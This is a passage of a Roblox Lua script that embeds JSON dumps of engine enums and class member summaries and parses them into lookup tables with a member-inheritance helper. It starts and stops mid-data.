um":"ReverbType"},{"type":"EnumItem","Name":"SewerPipe","tags":[],"Value":22,"Enum":"ReverbType"},{"type":"EnumItem","Name":"UnderWater","tags":[],"Value":23,"Enum":"ReverbType"},{"type":"Enum","Name":"RibbonTool","tags":[]},{"type":"EnumItem","Name":"Select","tags":[],"Value":0,"Enum":"RibbonTool"},{"type":"EnumItem","Name":"Scale","tags":[],"Value":1,"Enum":"RibbonTool"},{"type":"EnumItem","Name":"Rotate","tags":[],"Value":2,"Enum":"RibbonTool"},{"type":"EnumItem","Name":"Move","tags":[],"Value":3,"Enum":"RibbonTool"},{"type":"EnumItem","Name":"Transform","tags":[],"Value":4,"Enum":"RibbonTool"},{"type":"EnumItem","Name":"ColorPicker","tags":[],"Value":5,"Enum":"RibbonTool"},{"type":"EnumItem","Name":"MaterialPicker","tags":[],"Value":6,"Enum":"RibbonTool"},{"type":"EnumItem","Name":"Group","tags":[],"Value":7,"Enum":"RibbonTool"},{"type":"EnumItem","Name":"Ungroup","tags":[],"Value":8,"Enum":"RibbonTool"},{"type":"EnumItem","Name":"None","tags":[],"Value":9,"Enum":"RibbonTool"},{"type":"Enum","Name":"RollOffMode","tags":[]},{"type":"EnumItem","Name":"Inverse","tags":[],"Value":0,"Enum":"RollOffMode"},{"type":"EnumItem","Name":"Linear","tags":[],"Value":1,"Enum":"RollOffMode"},{"type":"EnumItem","Name":"InverseTapered","tags":[],"Value":3,"Enum":"RollOffMode"},{"type":"EnumItem","Name":"LinearSquare","tags":[],"Value":2,"Enum":"RollOffMode"},{"type":"Enum","Name":"RotationType","tags":[]},{"type":"EnumItem","Name":"MovementRelative","tags":[],"Value":0,"Enum":"RotationType"},{"type":"EnumItem","Name":"CameraRelative","tags":[],"Value":1,"Enum":"RotationType"},{"type":"Enum","Name":"RuntimeUndoBehavior","tags":[]},{"type":"EnumItem","Name":"Aggregate","tags":[],"Value":0,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Snapshot","tags":[],"Value":1,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Hybrid","tags":[],"Value":2,"Enum":"RuntimeUndoBehavior"},{"type":"Enum","Name":"SaveFilter","tags":[]},{"type":"EnumItem","Name":"SaveAll","tags":[],"Value":2,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveWorld","tags":[],"Value":0,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveGame","tags":[],"Value":1,"Enum":"SaveFilter"},{"type":"Enum","Name":"SavedQualitySetting","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel1","tags":[],"Value":1,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel2","tags":[],"Value":2,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel3","tags":[],"Value":3,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel4","tags":[],"Value":4,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel5","tags":[],"Value":5,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel6","tags":[],"Value":6,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel7","tags":[],"Value":7,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel8","tags":[],"Value":8,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel9","tags":[],"Value":9,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel10","tags":[],"Value":10,"Enum":"SavedQualitySetting"},{"type":"Enum","Name":"ScaleType","tags":[]},{"type":"EnumItem","Name":"Stretch","tags":[],"Value":0,"Enum":"ScaleType"},{"type":"EnumItem","Name":"Slice","tags":[],"Value":1,"Enum":"ScaleType"},{"type":"EnumItem","Name":"Tile","tags":[],"Value":2,"Enum":"ScaleType"},{"type":"Enum","Name":"ScreenOrientation","tags":[]},{"type":"EnumItem","Name":"LandscapeLeft","tags":[],"Value":0,"Enum":"ScreenOrientation"},{"type":"EnumItem","Name":"LandscapeRight","tags":[],"Value":1,"Enum":"ScreenOrientation"},{"type":"EnumItem","Name":"LandscapeSensor","tags":[],"Value":2,"Enum":"ScreenOrientation"},{"type":"EnumItem","Name":"Portrait","tags":[],"Value":3,"Enum":"ScreenOrientation"},{"type":"EnumItem","Name":"Sensor","tags":[],"Value":4,"Enum":"ScreenOrientation"},{"type":"Enum","Name":"ScrollBarInset","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"ScrollBarInset"},{"type":"EnumItem","Name":"ScrollBar","tags":[],"Value":1,"Enum":"ScrollBarInset"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"ScrollBarInset"},{"type":"Enum","Name":"SizeConstraint","tags":[]},{"type":"EnumItem","Name":"RelativeXY","tags":[],"Value":0,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeXX","tags":[],"Value":1,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeYY","tags":[],"Value":2,"Enum":"SizeConstraint"},{"type":"Enum","Name":"SleepAdjustMethod","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"LastSample","tags":[],"Value":1,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"AverageInterval","tags":[],"Value":2,"Enum":"SleepAdjustMethod"},{"type":"Enum","Name":"SortOrder","tags":[]},{"type":"EnumItem","Name":"LayoutOrder","tags":[],"Value":2,"Enum":"SortOrder"},{"type":"EnumItem","Name":"Name","tags":[],"Value":0,"Enum":"SortOrder"},{"type":"EnumItem","Name":"Custom","tags":["deprecated"],"Value":1,"Enum":"SortOrder"},{"type":"Enum","Name":"SoundType","tags":[]},{"type":"EnumItem","Name":"NoSound","tags":[],"Value":0,"Enum":"SoundType"},{"type":"EnumItem","Name":"Boing","tags":[],"Value":1,"Enum":"SoundType"},{"type":"EnumItem","Name":"Bomb","tags":[],"Value":2,"Enum":"SoundType"},{"type":"EnumItem","Name":"Break","tags":[],"Value":3,"Enum":"SoundType"},{"type":"EnumItem","Name":"Click","tags":[],"Value":4,"Enum":"SoundType"},{"type":"EnumItem","Name":"Clock","tags":[],"Value":5,"Enum":"SoundType"},{"type":"EnumItem","Name":"Slingshot","tags":[],"Value":6,"Enum":"SoundType"},{"type":"EnumItem","Name":"Page","tags":[],"Value":7,"Enum":"SoundType"},{"type":"EnumItem","Name":"Ping","tags":[],"Value":8,"Enum":"SoundType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":9,"Enum":"SoundType"},{"type":"EnumItem","Name":"Splat","tags":[],"Value":10,"Enum":"SoundType"},{"type":"EnumItem","Name":"Step","tags":[],"Value":11,"Enum":"SoundType"},{"type":"EnumItem","Name":"StepOn","tags":[],"Value":12,"Enum":"SoundType"},{"type":"EnumItem","Name":"Swoosh","tags":[],"Value":13,"Enum":"SoundType"},{"type":"EnumItem","Name":"Victory","tags":[],"Value":14,"Enum":"SoundType"},{"type":"Enum","Name":"SpecialKey","tags":[]},{"type":"EnumItem","Name":"Insert","tags":[],"Value":0,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"Home","tags":[],"Value":1,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":3,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":4,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"ChatHotkey","tags":[],"Value":5,"Enum":"SpecialKey"},{"type":"Enum","Name":"StartCorner","tags":[]},{"type":"EnumItem","Name":"TopLeft","tags":[],"Value":0,"Enum":"StartCorner"},{"type":"EnumItem","Name":"TopRight","tags":[],"Value":1,"Enum":"StartCorner"},{"type":"EnumItem","Name":"BottomLeft","tags":[],"Value":2,"Enum":"StartCorner"},{"type":"EnumItem","Name":"BottomRight","tags":[],"Value":3,"Enum":"StartCorner"},{"type":"Enum","Name":"Status","tags":[]},{"type":"EnumItem","Name":"Poison","tags":["deprecated"],"Value":0,"Enum":"Status"},{"type":"EnumItem","Name":"Confusion","tags":["deprecated"],"Value":1,"Enum":"Status"},{"type":"Enum","Name":"Style","tags":[]},{"type":"EnumItem","Name":"AlternatingSupports","tags":[],"Value":0,"Enum":"Style"},{"type":"EnumItem","Name":"BridgeStyleSupports","tags":[],"Value":1,"Enum":"Style"},{"type":"EnumItem","Name":"NoSupports","tags":[],"Value":2,"Enum":"Style"},{"type":"Enum","Name":"SurfaceConstraint","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":1,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":2,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":3,"Enum":"SurfaceConstraint"},{"type":"Enum","Name":"SurfaceType","tags":[]},{"type":"EnumItem","Name":"Smooth","tags":[],"Value":0,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":1,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":2,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Studs","tags":[],"Value":3,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Inlet","tags":[],"Value":4,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Universal","tags":[],"Value":5,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":6,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":7,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":8,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Unjoinable","tags":[],"Value":9,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SmoothNoOutlines","tags":[],"Value":10,"Enum":"SurfaceType"},{"type":"Enum","Name":"SwipeDirection","tags":[]},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Left","tags":[],"Value":1,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Up","tags":[],"Value":2,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Down","tags":[],"Value":3,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"SwipeDirection"},{"type":"Enum","Name":"TableMajorAxis","tags":[]},{"type":"EnumItem","Name":"RowMajor","tags":[],"Value":0,"Enum":"TableMajorAxis"},{"type":"EnumItem","Name":"ColumnMajor","tags":[],"Value":1,"Enum":"TableMajorAxis"},{"type":"Enum","Name":"TeleportState","tags":[]},{"type":"EnumItem","Name":"RequestedFromServer","tags":[],"Value":0,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Started","tags":[],"Value":1,"Enum":"TeleportState"},{"type":"EnumItem","Name":"WaitingForServer","tags":[],"Value":2,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Failed","tags":[],"Value":3,"Enum":"TeleportState"},{"type":"EnumItem","Name":"InProgress","tags":[],"Value":4,"Enum":"TeleportState"},{"type":"Enum","Name":"TeleportType","tags":[]},{"type":"EnumItem","Name":"ToPlace","tags":[],"Value":0,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToInstance","tags":[],"Value":1,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToReservedServer","tags":[],"Value":2,"Enum":"TeleportType"},{"type":"Enum","Name":"TextXAlignment","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Right","tags":[],"Value":1,"Enum":"TextXAlignment"},{"type":"Enum","Name":"TextYAlignment","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TextYAlignment"},{"type":"Enum","Name":"TextureMode","tags":[]},{"type":"EnumItem","Name":"Stretch","tags":[],"Value":0,"Enum":"TextureMode"},{"type":"EnumItem","Name":"Wrap","tags":[],"Value":1,"Enum":"TextureMode"},{"type":"EnumItem","Name":"Static","tags":[],"Value":2,"Enum":"TextureMode"},{"type":"Enum","Name":"TextureQueryType","tags":[]},{"type":"EnumItem","Name":"NonHumanoid","tags":[],"Value":0,"Enum":"TextureQueryType"},{"type":"EnumItem","Name":"NonHumanoidOrphaned","tags":[],"Value":1,"Enum":"TextureQueryType"},{"type":"EnumItem","Name":"Humanoid","tags":[],"Value":2,"Enum":"TextureQueryType"},{"type":"EnumItem","Name":"HumanoidOrphaned","tags":[],"Value":3,"Enum":"TextureQueryType"},{"type":"Enum","Name":"ThreadPoolConfig","tags":[]},{"type":"EnumItem","Name":"Auto","tags":[],"Value":0,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore1","tags":[],"Value":101,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore2","tags":[],"Value":102,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore3","tags":[],"Value":103,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore4","tags":[],"Value":104,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads1","tags":[],"Value":1,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads2","tags":[],"Value":2,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads3","tags":[],"Value":3,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads4","tags":[],"Value":4,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads8","tags":[],"Value":8,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads16","tags":[],"Value":16,"Enum":"ThreadPoolConfig"},{"type":"Enum","Name":"ThrottlingPriority","tags":[]},{"type":"EnumItem","Name":"Extreme","tags":[],"Value":2,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"ElevatedOnServer","tags":[],"Value":1,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ThrottlingPriority"},{"type":"Enum","Name":"ThumbnailSize","tags":[]},{"type":"EnumItem","Name":"Size48x48","tags":[],"Value":0,"Enum":"ThumbnailSize"},{"type":"EnumItem","Name":"Size180x180","tags":[],"Value":1,"Enum":"ThumbnailSize"},{"type":"EnumItem","Name":"Size420x420","tags":[],"Value":2,"Enum":"ThumbnailSize"},{"type":"EnumItem","Name":"Size60x60","tags":[],"Value":3,"Enum":"ThumbnailSize"},{"type":"EnumItem","Name":"Size100x100","tags":[],"Value":4,"Enum":"ThumbnailSize"},{"type":"EnumItem","Name":"Size150x150","tags":[],"Value":5,"Enum":"ThumbnailSize"},{"type":"EnumItem","Name":"Size352x352","tags":[],"Value":6,"Enum":"ThumbnailSize"},{"type":"Enum","Name":"ThumbnailType","tags":[]},{"type":"EnumItem","Name":"HeadShot","tags":[],"Value":0,"Enum":"ThumbnailType"},{"type":"EnumItem","Name":"AvatarBust","tags":[],"Value":1,"Enum":"ThumbnailType"},{"type":"EnumItem","Name":"AvatarThumbnail","tags":[],"Value":2,"Enum":"ThumbnailType"},{"type":"Enum","Name":"TickCountSampleMethod","tags":[]},{"type":"EnumItem","Name":"Fast","tags":[],"Value":0,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Benchmark","tags":[],"Value":1,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Precise","tags":[],"Value":2,"Enum":"TickCountSampleMethod"},{"type":"Enum","Name":"TopBottom","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TopBottom"},{"type":"Enum","Name":"TouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Orbital","tags":[],"Value":3,"Enum":"TouchCameraMovementMode"},{"type":"Enum","Name":"TouchMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"DynamicThumbstick","tags":[],"Value":5,"Enum":"TouchMovementMode"},{"type":"Enum","Name":"TweenStatus","tags":[]},{"type":"EnumItem","Name":"Canceled","tags":[],"Value":0,"Enum":"TweenStatus"},{"type":"EnumItem","Name":"Completed","tags":[],"Value":1,"Enum":"TweenStatus"},{"type":"Enum","Name":"UiMessageType","tags":[]},{"type":"EnumItem","Name":"UiMessageError","tags":[],"Value":0,"Enum":"UiMessageType"},{"type":"EnumItem","Name":"UiMessageInfo","tags":[],"Value":1,"Enum":"UiMessageType"},{"type":"Enum","Name":"UploadSetting","tags":[]},{"type":"EnumItem","Name":"Never","tags":[],"Value":0,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Ask","tags":[],"Value":1,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"UploadSetting"},{"type":"Enum","Name":"UserCFrame","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":1,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":2,"Enum":"UserCFrame"},{"type":"Enum","Name":"UserInputState","tags":[]},{"type":"EnumItem","Name":"Begin","tags":[],"Value":0,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Change","tags":[],"Value":1,"Enum":"UserInputState"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Cancel","tags":[],"Value":3,"Enum":"UserInputState"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"UserInputState"},{"type":"Enum","Name":"UserInputType","tags":[]},{"type":"EnumItem","Name":"MouseButton1","tags":[],"Value":0,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton2","tags":[],"Value":1,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton3","tags":[],"Value":2,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseWheel","tags":[],"Value":3,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseMovement","tags":[],"Value":4,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Touch","tags":[],"Value":7,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Keyboard","tags":[],"Value":8,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Focus","tags":[],"Value":9,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Accelerometer","tags":[],"Value":10,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gyro","tags":[],"Value":11,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad1","tags":[],"Value":12,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad2","tags":[],"Value":13,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad3","tags":[],"Value":14,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad4","tags":[],"Value":15,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad5","tags":[],"Value":16,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad6","tags":[],"Value":17,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad7","tags":[],"Value":18,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad8","tags":[],"Value":19,"Enum":"UserInputType"},{"type":"EnumItem","Name":"TextInput","tags":[],"Value":20,"Enum":"UserInputType"},{"type":"EnumItem","Name":"None","tags":[],"Value":21,"Enum":"UserInputType"},{"type":"Enum","Name":"VRTouchpad","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"VRTouchpad"},{"type":"EnumItem","Name":"Right","tags":[],"Value":1,"Enum":"VRTouchpad"},{"type":"Enum","Name":"VRTouchpadMode","tags":[]},{"type":"EnumItem","Name":"Touch","tags":[],"Value":0,"Enum":"VRTouchpadMode"},{"type":"EnumItem","Name":"VirtualThumbstick","tags":[],"Value":1,"Enum":"VRTouchpadMode"},{"type":"EnumItem","Name":"ABXY","tags":[],"Value":2,"Enum":"VRTouchpadMode"},{"type":"Enum","Name":"VerticalAlignment","tags":[]},{"type":"EnumItem","Name":"Center","tags":[],"Value":0,"Enum":"VerticalAlignment"},{"type":"EnumItem","Name":"Top","tags":[],"Value":1,"Enum":"VerticalAlignment"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"VerticalAlignment"},{"type":"Enum","Name":"VerticalScrollBarPosition","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":1,"Enum":"VerticalScrollBarPosition"},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"VerticalScrollBarPosition"},{"type":"Enum","Name":"VibrationMotor","tags":[]},{"type":"EnumItem","Name":"Large","tags":[],"Value":0,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftTrigger","tags":[],"Value":2,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightTrigger","tags":[],"Value":3,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":4,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":5,"Enum":"VibrationMotor"},{"type":"Enum","Name":"VideoQualitySettings","tags":[]},{"type":"EnumItem","Name":"LowResolution","tags":[],"Value":0,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"MediumResolution","tags":[],"Value":1,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"HighResolution","tags":[],"Value":2,"Enum":"VideoQualitySettings"},{"type":"Enum","Name":"WaterDirection","tags":[]},{"type":"EnumItem","Name":"NegX","tags":[],"Value":0,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegY","tags":[],"Value":2,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Y","tags":[],"Value":3,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":4,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Z","tags":[],"Value":5,"Enum":"WaterDirection"},{"type":"Enum","Name":"WaterForce","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":2,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Strong","tags":[],"Value":3,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Max","tags":[],"Value":4,"Enum":"WaterForce"},{"type":"Enum","Name":"ZIndexBehavior","tags":[]},{"type":"EnumItem","Name":"Global","tags":[],"Value":0,"Enum":"ZIndexBehavior"},{"type":"EnumItem","Name":"Sibling","tags":[],"Value":1,"Enum":"ZIndexBehavior"}]]==]
        -- TODO: Show critical error
    end
    rawAPI = Services.HttpService:JSONDecode(rawAPI)

    for _,entry in pairs(rawAPI) do
        local eType = entry.type
        if eType == "Class" then
            classes[entry.Name] = entry
            entry.Properties = {}
            entry.Functions = {}
            entry.YieldFunctions = {}
            entry.Events = {}
            entry.Callbacks = {}
        elseif eType == "Property" then
            table.insert(classes[entry.Class].Properties,entry)
            entry.Category = (propCategories[entry.Class] and propCategories[entry.Class][entry.Name] or "Other")
			entry.Tags = {}
			for i,tag in pairs(entry.tags) do
				entry.Tags[tag] = true
			end
			entry.tags = nil
        elseif eType == "Enum" then
            enums[entry.Name] = entry
            entry.EnumItems = {}
        elseif eType == "EnumItem" then
            table.insert(enums[entry.Enum].EnumItems,entry)
        end
    end

    local function getMember(class,mType)
        if not classes[class] or not classes[class][mType] then return end
        local result = {}

        local currentClass = classes[class]
        while currentClass do
            for _,entry in pairs(currentClass[mType]) do
                table.insert(result,entry)
            end
            currentClass = classes[currentClass.Superclass]
        end

        table.sort(result,function(a,b) return a.Name < b.Name end)
        return result
    end

    local API = {
        Classes = classes,
        Enums = enums,
        GetMember = getMember
    }

    return API
end

f.fetchRMD = function()
	local rawRMD = nil
    if script and script:FindFirstChild("RMD") then
        rawRMD = require(script.RMD)
    else
        rawRMD = [==[[{"Name":"BindableFunction","Summary":"Allow functions defined in one script to be called by another script","ExplorerOrder":4,"ExplorerImageIndex":66,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Invoke","Summary":"Causes the function assigned to OnInvoke to be called. Arguments passed to this function get passed to OnInvoke function.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"OnInvoke","Summary":"Should be defined as a function. This function is called when Invoke() is called. Number of arguments is variable.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BindableEvent","Summary":"Allow events defined in one script to be subscribed to by another script","ExplorerOrder":5,"ExplorerImageIndex":67,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Fire","Summary":"Used to make the custom event fire (see Event for more info). Arguments can be variable length.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Event","Summary":"This event fires when the Fire() method is used.  Receives the variable length arguments from Fire().","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TouchTransmitter","Summary":"Used by networking and replication code to transmit touch events - no other purpose","ExplorerOrder":3,"ExplorerImageIndex":37,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ForceField","Summary":"Prevents joint breakage from explosions, and stops Humanoids from taking damage","ExplorerOrder":3,"ExplorerImageIndex":37,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PluginManager","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TeleportService","Summary":"Allows players to seamlessly leave a game and join another","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Plugin","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PluginMouse","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Glue","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CollectionService","Summary":"A service which provides collections of instances based on tags assigned to them.","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"ItemAdded","Summary":"Deprecated. Use GetInstanceAddedSignal instead.","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"ItemRemoved","Summary":"Deprecated. Use GetInstancedRemovedSignal instead.","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"GetCollection","Summary":"Deprecated. Use GetTagged instead.","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"GetTagged","Summary":"Returns an array of all of the instances in the data model which have the given tag.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AddTag","Summary":"Adds a tag to an instance.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RemoveTag","Summary":"Removes a tag to an instance.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetTags","Summary":"Returns a list of all the collections that an instance belongs to.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"HasTag","Summary":"Returns whether the given instance has the given tag.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetInstanceAddedSignal","Summary":"Returns a signal that fires when the given tag either has a new instance with that tag added to the data model or that tag is assigned to an instance within the data model.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetInstanceRemovedSignal","Summary":"Returns a signal that fires when the given tag either has an instance with that tag removed from the data model or that tag is removed from an instance within the data 